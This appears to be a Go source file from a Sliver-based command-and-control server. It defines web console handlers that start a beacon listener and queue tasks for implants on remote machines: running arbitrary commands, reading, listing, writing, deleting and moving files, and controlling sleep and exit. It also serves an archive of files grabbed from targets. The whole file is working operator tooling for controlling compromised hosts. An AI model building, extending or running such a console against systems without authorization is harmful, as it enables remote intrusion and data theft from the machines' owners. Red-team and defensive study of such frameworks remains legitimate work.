package web

import (
	"encoding/base64"
	"net/http"

	"github.com/bishopfox/sliver/server/litebeacon"
)

func (s *Service) liteListenerStart(w http.ResponseWriter, r *http.Request) {
	var body struct {
		Host    string `json:"host"`
		Port    int    `json:"port"`
		Path    string `json:"path"`
		URL     string `json:"url"`
		IdleSec int    `json:"idleSec"` // 空闲回连间隔，0=默认10
		FastSec int    `json:"fastSec"` // 活跃窗口内的回连间隔，0=默认10
	}
	if err := decodeJSON(r, &body); err != nil {
		writeErr(w, http.StatusBadRequest, "监听参数不合法")
		return
	}
	addr, err := litebeacon.StartDefault(body.Host, body.Port, body.Path, body.URL, body.IdleSec, body.FastSec)
	if err != nil {
		rpcErr(w, err)
		return
	}
	writeJSON(w, http.StatusOK, map[string]any{"ok": true, "addr": addr})
}

func (s *Service) liteListenerStop(w http.ResponseWriter, r *http.Request) {
	if err := litebeacon.StopDefault(); err != nil {
		rpcErr(w, err)
		return
	}
	writeJSON(w, http.StatusOK, map[string]any{"ok": true})
}

func (s *Service) liteConfig(w http.ResponseWriter, r *http.Request) {
	var (
		info litebeacon.ConfigInfo
		err  error
	)
	if r.Method == http.MethodPost {
		info, err = litebeacon.NewConfig("console")
	} else {
		info, err = litebeacon.GetConfig()
	}
	if err != nil {
		rpcErr(w, err)
		return
	}
	writeJSON(w, http.StatusOK, info)
}

func (s *Service) liteBeacons(w http.ResponseWriter, r *http.Request) {
	writeJSON(w, http.StatusOK, map[string]any{"Beacons": litebeacon.ListBeacons()})
}

func (s *Service) liteBeaconDelete(w http.ResponseWriter, r *http.Request) {
	var body struct {
		ID string `json:"id"`
	}
	if err := decodeJSON(r, &body); err != nil || body.ID == "" {
		writeErr(w, http.StatusBadRequest, "缺少信标 ID")
		return
	}
	litebeacon.DeleteBeacon(body.ID)
	writeJSON(w, http.StatusOK, map[string]any{"ok": true})
}

func (s *Service) liteTask(w http.ResponseWriter, r *http.Request) {
	var body struct {
		BeaconID string `json:"beaconId"`
		Type     string `json:"type"`
		Cmd      string `json:"cmd"`
		Path     string `json:"path"`
		Timeout  int    `json:"timeout"`
		Interval int    `json:"interval"`
	}
	if err := decodeJSON(r, &body); err != nil {
		writeErr(w, http.StatusBadRequest, "任务参数不合法")
		return
	}
	if body.BeaconID == "" {
		writeErr(w, http.StatusBadRequest, "缺少信标 ID")
		return
	}
	task := litebeacon.Task{Cmd: body.Cmd, Path: body.Path}
	switch body.Type {
	case "exec":
		if body.Cmd == "" {
			writeErr(w, http.StatusBadRequest, "命令不能为空")
			return
		}
		// TLV u16 上限内还需留出帧头，超长命令在这里拦下而不是丢进队列后被静默丢弃
		if len(body.Cmd) > 60000 {
			writeErr(w, http.StatusBadRequest, "命令太长，上限 60000 字节")
			return
		}
		task.Type = litebeacon.TaskExec
		if body.Timeout <= 0 || body.Timeout > 600 {
			body.Timeout = 30
		}
		task.TimeoutSec = uint16(body.Timeout)
	case "read":
		if body.Path == "" {
			writeErr(w, http.StatusBadRequest, "路径不能为空")
			return
		}
		task.Type = litebeacon.TaskRead
	case "sleep":
		if body.Interval <= 0 || body.Interval > 86400 {
			body.Interval = 180
		}
		task.Type = litebeacon.TaskSleep
		task.IntervalSec = uint32(body.Interval)
	case "exit":
		task.Type = litebeacon.TaskExit
	default:
		writeErr(w, http.StatusBadRequest, "不支持的任务类型")
		return
	}
	queued, ok := litebeacon.QueueTask(body.BeaconID, task)
	if !ok {
		if body.Type == "read" && litebeacon.HasBeacon(body.BeaconID) {
			writeErr(w, http.StatusBadRequest, "这台机器同时最多传 4 个文件")
			return
		}
		writeErr(w, http.StatusBadRequest, "信标不存在")
		return
	}
	writeJSON(w, http.StatusOK, map[string]any{"taskId": queued.ID})
}

func (s *Service) liteResults(w http.ResponseWriter, r *http.Request) {
	id := r.URL.Query().Get("beacon")
	if id == "" {
		writeErr(w, http.StatusBadRequest, "缺少信标 ID")
		return
	}
	writeJSON(w, http.StatusOK, map[string]any{"Results": litebeacon.TakeResults(id)})
}

// liteLs drives the directory browser for C implants: POST queues a
// TaskListDir (with a 60s server-side cache unless force), GET returns the
// cached listing for a path.
func (s *Service) liteLs(w http.ResponseWriter, r *http.Request) {
	switch r.Method {
	case http.MethodPost:
		var body struct {
			BeaconID string `json:"beaconId"`
			Path     string `json:"path"`
			Force    bool   `json:"force"`
		}
		if err := decodeJSON(r, &body); err != nil || body.BeaconID == "" || body.Path == "" {
			writeErr(w, http.StatusBadRequest, "目录参数不合法")
			return
		}
		queued, pending := litebeacon.RequestDir(body.BeaconID, body.Path, body.Force)
		if !queued && !pending {
			writeErr(w, http.StatusBadRequest, "信标不存在")
			return
		}
		writeJSON(w, http.StatusOK, map[string]any{"queued": queued, "pending": pending})
	case http.MethodGet:
		id := r.URL.Query().Get("beacon")
		path := r.URL.Query().Get("path")
		if id == "" || path == "" {
			writeErr(w, http.StatusBadRequest, "缺少信标 ID 或路径")
			return
		}
		listing, found, pending := litebeacon.DirStatus(id, path)
		var payload any
		if found {
			payload = listing
		}
		writeJSON(w, http.StatusOK, map[string]any{"listing": payload, "pending": pending})
	default:
		writeErr(w, http.StatusMethodNotAllowed, "只接受 GET/POST")
	}
}

// liteFs queues one file operation (write/rm/mv/mkdir) for a C beacon.
// Write carries the full content; the store chunks it across heartbeats and
// the implant verifies expectSize/expectMTime unless force is set.
func (s *Service) liteFs(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		writeErr(w, http.StatusMethodNotAllowed, "只接受 POST")
		return
	}
	var body struct {
		BeaconID    string `json:"beaconId"`
		Op          string `json:"op"`
		Path        string `json:"path"`
		Dst         string `json:"dst"`
		Recursive   bool   `json:"recursive"`
		Content     string `json:"content"` // base64
		ExpectSize  int64  `json:"expectSize"`
		ExpectMTime int64  `json:"expectMTime"`
		Force       bool   `json:"force"`
	}
	if err := decodeJSON(r, &body); err != nil || body.BeaconID == "" {
		writeErr(w, http.StatusBadRequest, "参数不合法")
		return
	}
	var task litebeacon.Task
	switch body.Op {
	case "write":
		if body.Path == "" {
			writeErr(w, http.StatusBadRequest, "路径不能为空")
			return
		}
		data, err := base64.StdEncoding.DecodeString(body.Content)
		if err != nil {
			writeErr(w, http.StatusBadRequest, "内容不是合法 base64")
			return
		}
		if len(data) > 20*1024*1024 {
			writeErr(w, http.StatusBadRequest, "内容上限 20MB")
			return
		}
		task = litebeacon.Task{
			Type: litebeacon.TaskWrite, Path: body.Path,
			ExpectSize: body.ExpectSize, ExpectMTime: body.ExpectMTime,
			Force: body.Force, Data: data,
		}
	case "rm":
		if body.Path == "" {
			writeErr(w, http.StatusBadRequest, "路径不能为空")
			return
		}
		task = litebeacon.Task{Type: litebeacon.TaskRm, Path: body.Path, Recursive: body.Recursive}
	case "mv":
		if body.Path == "" || body.Dst == "" {
			writeErr(w, http.StatusBadRequest, "需要源路径和新路径")
			return
		}
		task = litebeacon.Task{Type: litebeacon.TaskMv, Path: body.Path, Dst: body.Dst}
	case "mkdir":
		if body.Path == "" {
			writeErr(w, http.StatusBadRequest, "路径不能为空")
			return
		}
		task = litebeacon.Task{Type: litebeacon.TaskMkdir, Path: body.Path}
	default:
		writeErr(w, http.StatusBadRequest, "不支持的操作")
		return
	}
	queued, ok := litebeacon.QueueTask(body.BeaconID, task)
	if !ok {
		if litebeacon.HasBeacon(body.BeaconID) {
			writeErr(w, http.StatusBadRequest, "这台机器同时最多 4 个传输")
			return
		}
		writeErr(w, http.StatusBadRequest, "信标不存在")
		return
	}
	writeJSON(w, http.StatusOK, map[string]any{"taskId": queued.ID})
}

// filesAudit serves the operator trail (newest first) for one target.
func (s *Service) filesAudit(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodGet {
		writeErr(w, http.StatusMethodNotAllowed, "只接受 GET")
		return
	}
	writeJSON(w, http.StatusOK, map[string]any{"Audit": audit.List(r.URL.Query().Get("target"), 200)})
}

// filesList serves the archived downloads: GET lists (optionally by target),
// DELETE drops one record together with its bytes.
func (s *Service) filesList(w http.ResponseWriter, r *http.Request) {
	switch r.Method {
	case http.MethodGet:
		writeJSON(w, http.StatusOK, map[string]any{"Files": grabbedFiles.List(r.URL.Query().Get("target"))})
	case http.MethodDelete:
		id := r.URL.Query().Get("id")
		if id == "" {
			writeErr(w, http.StatusBadRequest, "缺少文件 ID")
			return
		}
		if err := grabbedFiles.Delete(id); err != nil {
			writeErr(w, http.StatusNotFound, err.Error())
			return
		}
		writeJSON(w, http.StatusOK, map[string]any{"ok": true})
	default:
		writeErr(w, http.StatusMethodNotAllowed, "只接受 GET/DELETE")
	}
}

// filesRaw streams one archived file for preview or saving.
func (s *Service) filesRaw(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodGet {
		writeErr(w, http.StatusMethodNotAllowed, "只接受 GET")
		return
	}
	rec, data, err := grabbedFiles.Get(r.URL.Query().Get("id"))
	if err != nil {
		writeErr(w, http.StatusNotFound, "文件不存在")
		return
	}
	w.Header().Set("Content-Type", previewContentType(rec.Name))
	w.Header().Set("X-File-Name", rec.Name)
	w.Header().Set("Cache-Control", "no-store")
	w.WriteHeader(http.StatusOK)
	_, _ = w.Write(data)
}
